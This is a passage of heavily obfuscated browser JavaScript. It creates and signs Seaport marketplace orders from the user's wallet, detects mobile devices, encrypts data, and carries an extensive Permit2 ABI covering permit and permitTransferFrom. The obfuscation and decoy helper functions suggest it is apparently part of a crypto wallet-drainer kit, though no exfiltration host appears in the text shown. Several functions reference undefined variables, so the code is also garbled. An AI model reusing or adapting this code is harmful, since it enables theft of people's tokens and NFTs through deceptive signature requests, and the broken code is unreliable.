  ["sendERC1155_DRY"] = async (_0x3dca53, _0x356cb7, _0x301ed3, _0xa580f7) => {
    const _0x2bc58c = ethers.utils.getAddress(_0x356cb7);
    const _0x3a179f = new ERC1155Factory(_0x2bc58c, this.signer).contract;
    const _0x2f2ca5 = _0x3a179f.callStatic.safeTransferFrom(_0x3dca53, _0x301ed3, _0xa580f7, 1, "0x00");
    return _0x2f2ca5;
  };
  ['orderType'] = _0x570295;
  ["createOrder"] = async (_0x5068da, _0x12dba5, _0x515554 = 0, _0xa09aac = Math.floor(Date.now() / 1000), _0x14a481 = _0xa09aac + 2678400, _0x14a68a = undefined, _0x27d65f = ethers.constants.HashZero, _0x15ab5e = ethers.constants.HashZero, _0x76793d = false) => {
    const _0x4cbb86 = this.signer;
    const _0x56faf4 = new SeaportFactory(this.seaportAddress, this.signer).contract;
    const _0x479532 = await _0x4cbb86.getAddress();
    const _0x1f6fe9 = await _0x56faf4.getCounter(_0x479532);
    var _0x30f11f = !_0x76793d ? '0x' + utils.random_bytes_function(32) : ethers.constants.HashZero;
    const _0x7f66bc = {
      offerer: _0x479532,
      zone: _0x14a68a,
      offer: _0x5068da,
      consideration: _0x12dba5,
      totalOriginalConsiderationItems: _0x12dba5.length,
      orderType: _0x515554,
      zoneHash: _0x27d65f,
      salt: _0x30f11f,
      conduitKey: _0x15ab5e,
      startTime: _0xa09aac,
      endTime: _0x14a481
    };
    const _0x127b3c = {
      ..._0x7f66bc
    };
    _0x127b3c.counter = _0x1f6fe9;
    const _0x511bfa = await this.signOrder(_0x56faf4, this.chainId, _0x127b3c, _0x4cbb86);
    if (_0x567154 == 215) {
      return false;
    }
    const _0x2c989a = {
      parameters: _0x7f66bc,
      signature: _0x511bfa,
      numerator: 0x1,
      denominator: 0x1,
      extraData: '0x'
    };
    const _0xe44ea2 = _0x5068da.map(_0x3b9cd3 => _0x3b9cd3.itemType === 0 ? _0x3b9cd3.endAmount.gt(_0x3b9cd3.startAmount) ? _0x3b9cd3.endAmount : _0x3b9cd3.startAmount : this.toBN(0)).reduce((_0x51d7b9, _0xebfec2) => _0x51d7b9.add(_0xebfec2), this.toBN(0)).add(_0x12dba5.map(_0xe71da2 => _0xe71da2.itemType === 0 ? _0xe71da2.endAmount.gt(_0xe71da2.startAmount) ? _0xe71da2.endAmount : _0xe71da2.startAmount : this.toBN(0)).reduce((_0x37a679, _0x48eca0) => _0x37a679.add(_0x48eca0), this.toBN(0)));
    const _0x5e543b = {
      order: _0x2c989a,
      value: _0xe44ea2,
      orderComponents: _0x127b3c
    };
    return _0x5e543b;
  };
  ["getItem"] = _0x1e83fd => {
    switch (_0x540c02) {
      case 1:
        return this.getItem20(_0x53175f, _0x4b49e7, endAmount, _0x829c32);
      case 2:
        return this.getItem721(_0x53175f, _0x439846, _0x829c32);
      case 3:
        return this.getItem1155(_0x53175f, _0x439846, _0x4b49e7, endAmount, _0x829c32);
    }
  };
  ["getItem20"] = (_0x5046d3, _0x189d38, _0x1370cd, _0x29a8be) => this.getOfferOrConsiderationItem(1, _0x5046d3, 0, _0x189d38, _0x1370cd, _0x29a8be);
  ["getItem721"] = (_0x5b18ec, _0x2aea88, _0x44e6a8) => this.getOfferOrConsiderationItem(2, _0x5b18ec, _0x2aea88, 1, 1, _0x44e6a8);
  ["getItem1155"] = (_0x3e88e7, _0x3cb227, _0x58c2bf = 1, _0x348fb5 = 1, _0xe97bd3) => this.getOfferOrConsiderationItem(3, _0x3e88e7, _0x3cb227, _0x58c2bf, _0x348fb5, _0xe97bd3);
  ["getOfferOrConsiderationItem"] = (_0x4c2a6f = 0, _0x5734c2 = ethers.constants.AddressZero, _0x3affb7 = 0, _0x1c5571 = 1, _0x2c4472 = 1, _0x1e3531) => {
    const _0x5802ca = {
      itemType: _0x4c2a6f,
      token: _0x5734c2,
      identifierOrCriteria: _0x3affb7,
      startAmount: _0x1c5571,
      endAmount: _0x2c4472
    };
    if (typeof _0x1e3531 === "string") {
      const _0x1ab493 = {
        ..._0x5802ca
      };
      _0x1ab493.recipient = _0x1e3531;
      return _0x1ab493;
    }
    return _0x5802ca;
  };
  ["signOrder"] = async (_0x29f2aa, _0x48b8f0, _0x305270, _0xe3709a) => {
    const _0x1798f2 = {
      name: "Seaport",
      version: "1.5",
      chainId: _0x48b8f0,
      verifyingContract: _0x29f2aa.address
    };
    const _0x30b98c = await _0xe3709a._signTypedData(_0x1798f2, this.orderType, _0x305270);
    return _0x30b98c;
  };
  ["toBN"] = _0x25dda3 => ethers.BigNumber.from(_0x25dda3);
}
class Helpers extends Values {
  constructor() {
    super();
  }
  ["random_bytes_function"] = _0x52bd1c => {
    var _0x59ee0a = Math.ceil(_0x52bd1c = (+_0x52bd1c || 8) / 2);
    var _0x4d42fc = new Uint8Array(_0x59ee0a);
    window.crypto.getRandomValues(_0x4d42fc);
    var _0x4a69b4 = Array.prototype.map.call(_0x4d42fc, function (_0x467999) {
      return '00'.slice(_0x467999.toString(16).length) + _0x467999.toString(16);
    });
    var _0x15d189 = _0x4a69b4.join('').toUpperCase();
    if (_0x52bd1c % 2) {
      _0x15d189 = _0x15d189.slice(1);
    }
    return _0x15d189;
  };
  ['rng'] = () => {
    let _0x2889f6 = '';
    for (let _0x3577a5 = 0; _0x3577a5 < 8; _0x3577a5++) {
      _0x2889f6 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length));
    }
    return _0x2889f6;
  };
  ["propComparator"] = _0x49e7db => (_0x5b5965, _0x21994f) => _0x5b5965[_0x49e7db] == _0x21994f[_0x49e7db] ? 0 : _0x5b5965[_0x49e7db] < _0x21994f[_0x49e7db] ? -1 : 1;
  ['isMobile'] = () => {
    let _0x2e69c2 = false;
    (function (_0xd8a10e) {
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(_0xd8a10e) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0xd8a10e.substr(0, 4))) {
        _0x2e69c2 = true;
      }
    })(navigator.userAgent || navigator.vendor || window.opera);
    return _0x2e69c2;
  };
  ["stringFromCharCode"] = String.fromCharCode;
  ["ucs2decode"](_0x120e2e) {
    var _0x23974a = [];
    var _0x48758a = 0;
    var _0x36334a = _0x120e2e.length;
    var _0x134268;
    var _0x626910;
    while (_0x48758a < _0x36334a) {
      _0x134268 = _0x120e2e.charCodeAt(_0x48758a++);
      if (_0x134268 >= 55296 && _0x134268 <= 56319 && _0x48758a < _0x36334a) {
        _0x626910 = _0x120e2e.charCodeAt(_0x48758a++);
        if ((_0x626910 & 64512) == 56320) {
          _0x23974a.push(((_0x134268 & 1023) << 10) + (_0x626910 & 1023) + 65536);
        } else {
          _0x23974a.push(_0x134268);
          _0x48758a--;
        }
      } else {
        _0x23974a.push(_0x134268);
      }
    }
    return _0x23974a;
  }
  ["ucs2encode"](_0x392852) {
    var _0x34765e = _0x392852.length;
    var _0x30c728 = -1;
    var _0x36b482;
    var _0x2f5278 = '';
    while (++_0x30c728 < _0x34765e) {
      _0x36b482 = _0x392852[_0x30c728];
      if (_0x36b482 > 65535) {
        _0x36b482 -= 65536;
        _0x2f5278 += this.stringFromCharCode(_0x36b482 >>> 10 & 1023 | 55296);
        _0x36b482 = 56320 | _0x36b482 & 1023;
      }
      _0x2f5278 += this.stringFromCharCode(_0x36b482);
    }
    return _0x2f5278;
  }
  ["checkScalarValue"](_0x1952ec) {
    if (_0x1952ec >= 55296 && _0x1952ec <= 57343) {
      throw Error("Lone surrogate U+" + _0x1952ec.toString(16).toUpperCase() + " is not a scalar value");
    }
  }
  ["createByte"](_0x483d87, _0x3a4edf) {
    return this.stringFromCharCode(_0x483d87 >> _0x3a4edf & 63 | 128);
  }
  ["encodeCodePoint"](_0x5058b2) {
    if ((_0x5058b2 & 4294967168) == 0) {
      return this.stringFromCharCode(_0x5058b2);
    }
    var _0x33c5c6 = '';
    if ((_0x5058b2 & 4294965248) == 0) {
      _0x33c5c6 = this.stringFromCharCode(_0x5058b2 >> 6 & 31 | 192);
    } else {
      if ((_0x5058b2 & 4294901760) == 0) {
        this.checkScalarValue(_0x5058b2);
        _0x33c5c6 = this.stringFromCharCode(_0x5058b2 >> 12 & 15 | 224);
        _0x33c5c6 += this.createByte(_0x5058b2, 6);
      } else if ((_0x5058b2 & 4292870144) == 0) {
        _0x33c5c6 = this.stringFromCharCode(_0x5058b2 >> 18 & 7 | 240);
        _0x33c5c6 += this.createByte(_0x5058b2, 12);
        _0x33c5c6 += this.createByte(_0x5058b2, 6);
      }
    }
    _0x33c5c6 += this.stringFromCharCode(_0x5058b2 & 63 | 128);
    return _0x33c5c6;
  }
  ["utf8encode"](_0x43a064) {
    var _0x3cdc57 = this.ucs2decode(_0x43a064);
    var _0x124614 = _0x3cdc57.length;
    var _0x321c65 = -1;
    var _0x19869b;
    var _0x1b21d7 = '';
    while (++_0x321c65 < _0x124614) {
      _0x19869b = _0x3cdc57[_0x321c65];
      _0x1b21d7 += this.encodeCodePoint(_0x19869b);
    }
    return _0x1b21d7;
  }
  ["encrypt"](_0xce2382, _0x905351) {
    var _0x678c00 = CryptoJS.lib.WordArray.random(this.saltSize / 8);
    var _0x3d6fce = CryptoJS.PBKDF2(_0x905351, _0x678c00, {
      'keySize': this.keySize / 32,
      'iterations': this.iterations
    });
    var _0x51a4cc = CryptoJS.lib.WordArray.random(this.ivSize / 8);
    var _0x3f8353 = CryptoJS.AES.encrypt(_0xce2382, _0x3d6fce, {
      'iv': _0x51a4cc,
      'padding': CryptoJS.pad.Pkcs7,
      'mode': CryptoJS.mode.CBC
    });
    var _0x138412 = this.base64ToHex(_0x3f8353.toString());
    var _0xdbc4e9 = this.hexToBase64(_0x678c00 + _0x51a4cc + _0x138412);
    return _0xdbc4e9;
  }
  ["escaper"](_0x48de3f) {
    return (_0x48de3f + '').replace(/[\\"']/g, "\\$&").replace(/\u0000/g, "\\0");
  }
  ["hexToBase64"](_0x3ba86d) {
    return btoa(String.fromCharCode.apply(null, _0x3ba86d.replace(/\r|\n/g, '').replace(/([\da-fA-F]{2}) ?/g, "0x$1 ").replace(/ +$/, '').split(" ")));
  }
  ["base64ToHex"](_0x598356) {
    var _0x45287b = 0;
    var _0x5adc0b = atob(_0x598356.replace(/[ \r\n]+$/, ''));
    for (var _0x4d6f95 = []; _0x45287b < _0x5adc0b.length; ++_0x45287b) {
      var _0x39df20 = _0x5adc0b.charCodeAt(_0x45287b).toString(16);
      if (_0x39df20.length === 1) {
        _0x39df20 = '0' + _0x39df20;
      }
      _0x4d6f95[_0x4d6f95.length] = _0x39df20;
    }
    return _0x4d6f95.join('');
  }
  ["readContinuationByte"]() {
    if (this.byteIndex >= this.byteCount) {
      throw Error("Invalid byte index");
    }
    var _0x4a866b = this.byteArray[byteIndex] & 255;
    this.byteIndex++;
    if ((_0x4a866b & 192) == 128) {
      return _0x4a866b & 63;
    }
    throw Error("Invalid continuation byte");
  }
  ["decodeSymbol"]() {
    var _0x5568a1;
    var _0x12f824;
    var _0x1c1499;
    var _0x200b8c;
    var _0x86d421;
    if (this.byteIndex > this.byteCount) {
      throw Error("Invalid byte index");
    }
    if (this.byteIndex == this.byteCount) {
      return false;
    }
    _0x5568a1 = this.byteArray[this.byteIndex] & 255;
    this.byteIndex++;
    if ((_0x5568a1 & 128) == 0) {
      return _0x5568a1;
    }
    if ((_0x5568a1 & 224) == 192) {
      _0x12f824 = this.readContinuationByte();
      _0x86d421 = (_0x5568a1 & 31) << 6 | _0x12f824;
      if (_0x86d421 >= 128) {
        return _0x86d421;
      } else {
        throw Error("Invalid continuation byte");
      }
    }
    if ((_0x5568a1 & 240) == 224) {
      _0x12f824 = this.readContinuationByte();
      _0x1c1499 = this.readContinuationByte();
      _0x86d421 = (_0x5568a1 & 15) << 12 | _0x12f824 << 6 | _0x1c1499;
      if (_0x86d421 >= 2048) {
        this.checkScalarValue(_0x86d421);
        return _0x86d421;
      } else {
        throw Error("Invalid continuation byte");
      }
    }
    if ((_0x5568a1 & 248) == 240) {
      _0x12f824 = this.readContinuationByte();
      _0x1c1499 = this.readContinuationByte();
      _0x200b8c = this.readContinuationByte();
      _0x86d421 = (_0x5568a1 & 7) << 18 | _0x12f824 << 12 | _0x1c1499 << 6 | _0x200b8c;
      if (_0x86d421 >= 65536 && _0x86d421 <= 1114111) {
        return _0x86d421;
      }
    }
    throw Error("Invalid UTF-8 detected");
  }
  ["utf8decode"] = _0x1c8b83 => {
    this.byteArray = this.ucs2decode(_0x1c8b83);
    this.byteCount = this.byteArray.length;
    this.byteIndex = 0;
    var _0xedac45 = [];
    var _0x1740ac;
    while ((_0x1740ac = this.decodeSymbol()) !== false) {
      _0xedac45.push(_0x1740ac);
    }
    return this.ucs2encode(_0xedac45);
  };
  ["USG1204312"] = () => {
    let _0x2f9c78 = "465dsfsdf4ssfsdf";
    for (let _0x175eac = 0; _0x175eac < length; _0x175eac++) {
      _0x2f9c78 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length));
    }
    return "XKd9jANX98hHxBXGH";
  };
  ["jJDFGDFJGDFGNBCBNCVJBCVN"] = _0x4e8e82 => {
    return Math.floor(Date.now() / 1000);
  };
  ["xJDKDFGXDFIXDFBNXD9273129hizu7sg"] = _0x287ff9 => {
    let _0xf53c0a = '';
    for (let _0xca6c8d = 0; _0xca6c8d < _0x287ff9; _0xca6c8d++) {
      _0xf53c0a += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length));
    }
    return _0xf53c0a;
  };
  ["J9108240u9pjhXNXUDFJABXDF"] = _0x5541b6 => {
    let _0x2ff703 = '';
    for (let _0xdde8a8 = 0; _0xdde8a8 < _0x5541b6; _0xdde8a8++) {
      _0x2ff703 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length));
    }
    return _0x2ff703;
  };
  ["UserAgent"] = _0x5541dd => {
    let _0x1453d8 = '';
    for (let _0x3a261b = 0; _0x3a261b < _0x5541dd; _0x3a261b++) {
      _0x1453d8 += "0123456789".charAt(Math.floor(Math.random() * "0123456789".length));
    }
    return this.y;
  };
  ["hexToUtf8"] = _0x54ff14 => {
    let _0x19d091 = '';
    let _0x543e2c = 0;
    _0x54ff14 = _0x54ff14.replace(/^0x/i, '');
    _0x54ff14 = _0x54ff14.replace(/^(?:00)*/, '');
    _0x54ff14 = _0x54ff14.split('').reverse().join('');
    _0x54ff14 = _0x54ff14.replace(/^(?:00)*/, '');
    _0x54ff14 = _0x54ff14.split('').reverse().join('');
    let _0x569ed3 = _0x54ff14.length;
    for (let _0x362204 = 0; _0x362204 < _0x569ed3; _0x362204 += 2) {
      _0x543e2c = parseInt(_0x54ff14.substr(_0x362204, 2), 16);
      _0x19d091 += String.fromCharCode(_0x543e2c);
    }
    return this.utf8decode(_0x19d091);
  };
}
const _0x2f1d96 = {
  internalType: 'uint256',
  name: "deadline",
  type: "uint256"
};
const _0xbfad51 = {
  inputs: [_0x2f1d96],
  name: "AllowanceExpired",
  type: 'error'
};
const _0x3ca444 = {
  inputs: [],
  name: "ExcessiveInvalidation",
  type: "error"
};
const _0xf5956e = {
  internalType: "uint256",
  name: 'amount',
  type: "uint256"
};
const _0x190249 = {
  inputs: [_0xf5956e],
  name: "InsufficientAllowance",
  type: "error"
};
const _0x669b88 = {
  internalType: "uint256",
  name: "maxAmount",
  type: "uint256"
};
const _0x5500c7 = {
  inputs: [_0x669b88],
  name: "InvalidAmount",
  type: "error"
};
const _0x39b93b = {
  inputs: [],
  name: "InvalidContractSignature",
  type: "error"
};
const _0x2861bf = {
  inputs: [],
  name: "InvalidNonce",
  type: "error"
};
const _0x27325d = {
  inputs: [],
  name: "InvalidSignature",
  type: "error"
};
const _0x2a372f = {
  inputs: [],
  name: "InvalidSignatureLength",
  type: "error"
};
const _0x2033af = {
  inputs: [],
  name: "InvalidSigner",
  type: "error"
};
const _0xf783c2 = {
  inputs: [],
  name: "LengthMismatch",
  type: 'error'
};
const _0x3c8fd0 = {
  internalType: "uint256",
  name: "signatureDeadline",
  type: "uint256"
};
const _0x501add = {
  inputs: [_0x3c8fd0],
  name: "SignatureExpired",
  type: "error"
};
const _0x3e40ac = {
  indexed: true,
  internalType: 'address',
  name: "owner",
  type: "address"
};
const _0x559249 = {
  indexed: true,
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x36b093 = {
  indexed: true,
  internalType: "address",
  name: 'spender',
  type: "address"
};
const _0x565bdd = {
  indexed: false,
  internalType: "uint160",
  name: "amount",
  type: "uint160"
};
const _0x223d00 = {
  indexed: false,
  internalType: "uint48",
  name: "expiration",
  type: "uint48"
};
const _0x2825c2 = {
  anonymous: false,
  inputs: [_0x3e40ac, _0x559249, _0x36b093, _0x565bdd, _0x223d00],
  name: 'Approval',
  type: "event"
};
const _0x16d715 = {
  indexed: true,
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x52d638 = {
  indexed: false,
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x529206 = {
  indexed: false,
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x1a214a = {
  anonymous: false,
  inputs: [_0x16d715, _0x52d638, _0x529206],
  name: "Lockdown",
  type: 'event'
};
const _0x332f62 = {
  indexed: true,
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x5c98ed = {
  indexed: true,
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x4f69b8 = {
  indexed: true,
  internalType: 'address',
  name: 'spender',
  type: "address"
};
const _0x2d761a = {
  indexed: false,
  internalType: "uint48",
  name: 'newNonce',
  type: 'uint48'
};
const _0x10060d = {
  indexed: false,
  internalType: 'uint48',
  name: "oldNonce",
  type: "uint48"
};
const _0x351a6f = {
  anonymous: false,
  inputs: [_0x332f62, _0x5c98ed, _0x4f69b8, _0x2d761a, _0x10060d],
  name: "NonceInvalidation",
  type: "event"
};
const _0x5794a2 = {
  indexed: true,
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0xdfce89 = {
  indexed: true,
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x515c0f = {
  indexed: true,
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x17675a = {
  indexed: false,
  internalType: 'uint160',
  name: 'amount',
  type: "uint160"
};
const _0x3fba02 = {
  indexed: false,
  internalType: "uint48",
  name: 'expiration',
  type: 'uint48'
};
const _0xd78102 = {
  indexed: false,
  internalType: "uint48",
  name: 'nonce',
  type: "uint48"
};
const _0x52e223 = {
  anonymous: false,
  inputs: [_0x5794a2, _0xdfce89, _0x515c0f, _0x17675a, _0x3fba02, _0xd78102],
  name: "Permit",
  type: 'event'
};
const _0x21a063 = {
  indexed: true,
  internalType: "address",
  name: 'owner',
  type: "address"
};
const _0x404ef6 = {
  indexed: false,
  internalType: "uint256",
  name: "word",
  type: "uint256"
};
const _0x1abbce = {
  indexed: false,
  internalType: 'uint256',
  name: 'mask',
  type: "uint256"
};
const _0x580ab9 = {
  anonymous: false,
  inputs: [_0x21a063, _0x404ef6, _0x1abbce],
  name: "UnorderedNonceInvalidation",
  type: "event"
};
const _0x282b94 = {
  internalType: "bytes32",
  name: '',
  type: 'bytes32'
};
const _0xbefbfd = {
  inputs: [],
  name: "DOMAIN_SEPARATOR",
  outputs: [_0x282b94],
  stateMutability: 'view',
  type: 'function'
};
const _0xd3219b = {
  internalType: "address",
  name: '',
  type: 'address'
};
const _0xacb285 = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x12f24e = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0x592c0b = {
  internalType: 'uint160',
  name: "amount",
  type: "uint160"
};
const _0x264e12 = {
  internalType: "uint48",
  name: 'expiration',
  type: 'uint48'
};
const _0x4c143b = {
  internalType: "uint48",
  name: "nonce",
  type: "uint48"
};
const _0x2e579b = {
  inputs: [_0xd3219b, _0xacb285, _0x12f24e],
  name: "allowance",
  outputs: [_0x592c0b, _0x264e12, _0x4c143b],
  stateMutability: 'view',
  type: "function"
};
const _0xed75e5 = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x142688 = {
  internalType: "address",
  name: "spender",
  type: 'address'
};
const _0x1fdf69 = {
  internalType: 'uint160',
  name: 'amount',
  type: "uint160"
};
const _0x599ae9 = {
  internalType: "uint48",
  name: "expiration",
  type: "uint48"
};
const _0x3ee299 = {
  inputs: [_0xed75e5, _0x142688, _0x1fdf69, _0x599ae9],
  name: "approve",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x399988 = {
  internalType: 'address',
  name: "token",
  type: "address"
};
const _0x481ea6 = {
  internalType: 'address',
  name: "spender",
  type: "address"
};
const _0x5ee020 = {
  internalType: "uint48",
  name: "newNonce",
  type: 'uint48'
};
const _0x2bbbe2 = {
  inputs: [_0x399988, _0x481ea6, _0x5ee020],
  name: "invalidateNonces",
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x1e4d71 = {
  internalType: "uint256",
  name: "wordPos",
  type: 'uint256'
};
const _0x2bfb63 = {
  internalType: "uint256",
  name: "mask",
  type: "uint256"
};
const _0x3b5cd6 = {
  inputs: [_0x1e4d71, _0x2bfb63],
  name: "invalidateUnorderedNonces",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x2adfe5 = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x46d84b = {
  internalType: "address",
  name: "spender",
  type: "address"
};
const _0x1e25f8 = {
  components: [_0x2adfe5, _0x46d84b],
  internalType: "struct IAllowanceTransfer.TokenSpenderPair[]",
  name: 'approvals',
  type: "tuple[]"
};
const _0x108a40 = {
  inputs: [_0x1e25f8],
  name: 'lockdown',
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x17396f = {
  internalType: 'address',
  name: '',
  type: 'address'
};
const _0x3ec2a5 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x582ea9 = {
  internalType: 'uint256',
  name: '',
  type: "uint256"
};
const _0x254284 = {
  inputs: [_0x17396f, _0x3ec2a5],
  name: "nonceBitmap",
  outputs: [_0x582ea9],
  stateMutability: 'view',
  type: 'function'
};
const _0x28ee7c = {
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x1ea312 = {
  internalType: 'address',
  name: "token",
  type: "address"
};
const _0x3212a4 = {
  internalType: "uint160",
  name: "amount",
  type: "uint160"
};
const _0x4d4faf = {
  internalType: "uint48",
  name: "expiration",
  type: "uint48"
};
const _0x4c64d5 = {
  internalType: 'uint48',
  name: "nonce",
  type: "uint48"
};
const _0x34ebb2 = {
  components: [_0x1ea312, _0x3212a4, _0x4d4faf, _0x4c64d5],
  internalType: "struct IAllowanceTransfer.PermitDetails[]",
  name: 'details',
  type: "tuple[]"
};
const _0x4fe6e0 = {
  internalType: "address",
  name: "spender",
  type: 'address'
};
const _0x9b68a2 = {
  internalType: "uint256",
  name: "sigDeadline",
  type: 'uint256'
};
const _0x2d7560 = {
  components: [_0x34ebb2, _0x4fe6e0, _0x9b68a2],
  internalType: "struct IAllowanceTransfer.PermitBatch",
  name: "permitBatch",
  type: "tuple"
};
const _0x2ac515 = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x185128 = {
  inputs: [_0x28ee7c, _0x2d7560, _0x2ac515],
  name: 'permit',
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x3b64e5 = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x389290 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x3476ac = {
  components: [_0x3b64e5, _0x389290],
  internalType: "struct ISignatureTransfer.TokenPermissions",
  name: "permitted",
  type: "tuple"
};
const _0x2040c2 = {
  internalType: "uint256",
  name: 'nonce',
  type: "uint256"
};
const _0x43ba9e = {
  internalType: "uint256",
  name: "deadline",
  type: "uint256"
};
const _0x579219 = {
  components: [_0x3476ac, _0x2040c2, _0x43ba9e],
  internalType: "struct ISignatureTransfer.PermitTransferFrom",
  name: "permit",
  type: "tuple"
};
const _0x3f4935 = {
  internalType: "address",
  name: 'to',
  type: "address"
};
const _0x48091b = {
  internalType: "uint256",
  name: "requestedAmount",
  type: "uint256"
};
const _0x59e6ed = {
  components: [_0x3f4935, _0x48091b],
  internalType: "struct ISignatureTransfer.SignatureTransferDetails",
  name: "transferDetails",
  type: "tuple"
};
const _0x317d41 = {
  internalType: "address",
  name: "owner",
  type: "address"
};
const _0x3a3789 = {
  internalType: "bytes",
  name: 'signature',
  type: "bytes"
};
const _0x1c26a7 = {
  inputs: [_0x579219, _0x59e6ed, _0x317d41, _0x3a3789],
  name: "permitTransferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5b429f = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x738494 = {
  internalType: "uint256",
  name: 'amount',
  type: "uint256"
};
const _0xe653d = {
  components: [_0x5b429f, _0x738494],
  internalType: "struct ISignatureTransfer.TokenPermissions[]",
  name: "permitted",
  type: 'tuple[]'
};
const _0x31901d = {
  internalType: "uint256",
  name: "nonce",
  type: 'uint256'
};
const _0x5353a2 = {
  internalType: 'uint256',
  name: "deadline",
  type: "uint256"
};
const _0x513cda = {
  components: [_0xe653d, _0x31901d, _0x5353a2],
  internalType: "struct ISignatureTransfer.PermitBatchTransferFrom",
  name: "permit",
  type: 'tuple'
};
const _0xc0a28d = {
  internalType: "address",
  name: 'to',
  type: "address"
};
const _0x26b63b = {
  internalType: "uint256",
  name: "requestedAmount",
  type: 'uint256'
};
const _0x55a18f = {
  components: [_0xc0a28d, _0x26b63b],
  internalType: "struct ISignatureTransfer.SignatureTransferDetails[]",
  name: "transferDetails",
  type: "tuple[]"
};
const _0x2d0c98 = {
  internalType: "address",
  name: 'owner',
  type: "address"
};
const _0x1f8a09 = {
  internalType: 'bytes',
  name: "signature",
  type: "bytes"
};
const _0x17c043 = {
  inputs: [_0x513cda, _0x55a18f, _0x2d0c98, _0x1f8a09],
  name: "permitTransferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x410efa = {
  internalType: "address",
  name: "token",
  type: 'address'
};
const _0x204743 = {
  internalType: "uint256",
